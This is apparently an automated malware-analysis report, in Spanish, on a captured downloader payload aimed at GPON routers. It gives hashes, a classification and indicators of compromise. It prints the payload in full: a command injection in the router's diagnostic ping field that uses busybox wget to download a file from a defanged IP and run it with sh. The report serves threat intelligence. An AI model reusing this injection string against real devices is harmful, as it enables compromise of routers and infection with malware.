# 🧬 Payload Analysis

`5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758`

## 📌 Resumen

Texto ASCII de 130 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `ger` en `hxxp://140.233.190.XXX/gpon+-O+/tmp/ger`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh /tmp/ger`
2. `sh /tmp/` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758.md](../../../../../malware-like/oraculo/downloader/5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:01:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758`
- **SHA1:** `fd57b928acdbeec1fd37c3eeda2fa1fa6501fee0`
- **MD5:** `e7e2b643deac2d78f0f57004c1902cd2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 130 B |
| Entropía | 5.06 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/ger | strings |
| ip | 140.233.190.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+hxxp://140.233.190.XXX/gpon+-O+/tmp/ger;sh+/tmp/ | strings |
| hash | 5747a16f0eff4c3bb578a935ec59f7302d18664dc219ebffac383783d18d3758 | static_analysis |
| ip | 179.130.237.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
